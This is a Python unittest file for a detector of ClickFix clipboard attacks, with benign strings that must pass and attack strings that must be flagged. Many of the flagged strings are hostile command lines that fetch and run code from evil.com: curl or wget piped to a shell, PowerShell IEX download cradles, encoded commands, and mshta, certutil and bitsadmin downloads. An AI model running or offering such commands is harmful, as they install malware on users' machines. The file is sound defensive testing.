"""Tests for ClickFix clipboard detection."""
import sys
import os
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from detection import check_for_suspicious_content


class TestClean(unittest.TestCase):
    """Content that should NOT trigger a warning."""

    def test_none_input(self):
        self.assertIsNone(check_for_suspicious_content(None))

    def test_empty_string(self):
        self.assertIsNone(check_for_suspicious_content(""))

    def test_plain_text(self):
        self.assertIsNone(check_for_suspicious_content("Hello, world!"))

    def test_normal_url(self):
        self.assertIsNone(check_for_suspicious_content("https://example.com/file.html"))

    def test_developer_curl_no_pipe(self):
        self.assertIsNone(check_for_suspicious_content("curl https://example.com/data.json"))

    def test_developer_wget_no_pipe(self):
        self.assertIsNone(check_for_suspicious_content("wget https://example.com/file.zip"))

    def test_single_medium_url(self):
        # One .sh URL alone should NOT trigger (needs 2+ medium hits)
        self.assertIsNone(check_for_suspicious_content("https://example.com/install.sh"))

    def test_oversized_content_skipped(self):
        # Content over 10,000 chars is skipped entirely
        self.assertIsNone(check_for_suspicious_content("x" * 10_001))

    # False positives from issue #18 — bare keywords without command context
    def test_bare_powershell_mention(self):
        self.assertIsNone(check_for_suspicious_content("PowerShell is a scripting language"))

    def test_bare_certutil_mention(self):
        self.assertIsNone(check_for_suspicious_content("Learn about certutil certificate management"))

    def test_bare_iex_mention(self):
        self.assertIsNone(check_for_suspicious_content("The IEX stock exchange opened higher today"))

    def test_bare_invoke_webrequest_mention(self):
        self.assertIsNone(check_for_suspicious_content("Use Invoke-WebRequest to download files from the web"))

    def test_bare_invoke_expression_mention(self):
        self.assertIsNone(check_for_suspicious_content("The Invoke-Expression cmdlet evaluates a string"))

    def test_plain_text_zsh_mention(self):
        self.assertIsNone(check_for_suspicious_content("Install zsh on your Mac for a better shell experience"))

    def test_plain_text_base64_mention(self):
        self.assertIsNone(check_for_suspicious_content("The base64 encoding scheme is used to encode binary data"))


class TestSuspicious(unittest.TestCase):
    """Content that SHOULD trigger a warning."""

    def test_curl_pipe_sh(self):
        self.assertIsNotNone(check_for_suspicious_content("curl https://evil.com/payload | sh"))

    def test_curl_pipe_bash(self):
        self.assertIsNotNone(check_for_suspicious_content("curl https://evil.com/payload | bash"))

    def test_wget_pipe_sh(self):
        self.assertIsNotNone(check_for_suspicious_content("wget https://evil.com/payload | sh"))

    def test_wget_pipe_bash(self):
        self.assertIsNotNone(check_for_suspicious_content("wget https://evil.com/payload | bash"))

    def test_curl_pipe_zsh(self):
        self.assertIsNotNone(check_for_suspicious_content("curl https://evil.com/payload | zsh"))

    def test_wget_pipe_zsh(self):
        self.assertIsNotNone(check_for_suspicious_content("wget https://evil.com/payload | zsh"))

    def test_base64_macos_decode_pipe_zsh(self):
        # macOS base64 -D (capital D) — Anvilogic high-fidelity indicator
        self.assertIsNotNone(check_for_suspicious_content('echo "SGVsbG8=" | base64 -D | zsh'))

    def test_base64_linux_decode_pipe_bash(self):
        # Odyssey Stealer pattern: no curl, standalone base64 -d
        self.assertIsNotNone(check_for_suspicious_content('echo "SGVsbG8=" | base64 -d | bash'))

    def test_base64_decode_pipe_sh(self):
        self.assertIsNotNone(check_for_suspicious_content('echo "SGVsbG8=" | base64 -d | sh'))

    def test_curl_pipe_osascript(self):
        # Datadog-documented pattern: pipe to osascript without -e flag
        self.assertIsNotNone(check_for_suspicious_content("curl https://evil.com/script | osascript"))

    def test_mshta_hex_url(self):
        # Huntress-documented pattern: hex-encoded IP in mshta URL
        self.assertIsNotNone(check_for_suspicious_content("mshta http://81.0x5a.29.64/payload"))

    def test_certutil_decode(self):
        self.assertIsNotNone(check_for_suspicious_content("certutil -decode encoded.txt output.exe"))

    def test_powershell(self):
        self.assertIsNotNone(check_for_suspicious_content("powershell -Command Get-Process"))

    def test_powershell_case_insensitive(self):
        self.assertIsNotNone(check_for_suspicious_content("PowerShell -NoProfile"))

    def test_iex(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "IEX (New-Object Net.WebClient).DownloadString(" + "'http://evil.com')"
        ))

    def test_invoke_expression_with_variable(self):
        self.assertIsNotNone(check_for_suspicious_content("Invoke-Expression $payload"))

    def test_invoke_webrequest(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "Invoke-WebRequest -Uri http://evil.com -OutFile payload.exe"
        ))

    def test_encoded_command(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "powershell -EncodedCommand JABjAD0ATgBlAHcA"
        ))

    def test_enc_with_base64(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "powershell -enc JABjAD0ATgBlAHcALQBPAGIA"
        ))

    def test_osascript(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "osascript -e do shell script curl evil.com"
        ))

    def test_mshta(self):
        self.assertIsNotNone(check_for_suspicious_content("mshta http://evil.com/payload.hta"))

    def test_certutil(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "certutil -urlcache -split -f http://evil.com/evil.exe"
        ))

    def test_bitsadmin(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "bitsadmin /transfer job http://evil.com/evil.exe"
        ))

    def test_two_medium_urls_trigger(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "https://a.com/a.sh and https://b.com/b.sh"
        ))

    def test_returns_string_not_bool(self):
        result = check_for_suspicious_content("curl https://evil.com | bash")
        self.assertIsInstance(result, str)
        self.assertGreater(len(result), 0)


class TestRealisticPayloads(unittest.TestCase):
    """Realistic ClickFix payloads as they appear in the wild."""

    def test_curl_pipe_bash_with_path(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "curl https://evil.com/install.sh | bash"
        ))

    def test_wget_pipe_sh_realistic(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "wget https://evil.com/payload | sh"
        ))

    def test_powershell_iex_download_string(self):
        payload = (
            "powershell -NoProfile -ExecutionPolicy Bypass -Command"
            " IEX (New-Object Net.WebClient).DownloadString http://evil.com"
        )
        self.assertIsNotNone(check_for_suspicious_content(payload))

    def test_osascript_shell_curl(self):
        payload = "osascript -e do shell script curl http://evil.com/payload bash"
        self.assertIsNotNone(check_for_suspicious_content(payload))

    def test_powershell_enc_long_base64(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQA"
        ))

    def test_two_payload_urls_mixed_extensions(self):
        self.assertIsNotNone(check_for_suspicious_content(
            "Step 1: https://setup.evil.com/bootstrap.sh Step 2: https://cdn.evil.com/agent.ps1"
        ))


if __name__ == "__main__":
    unittest.main()
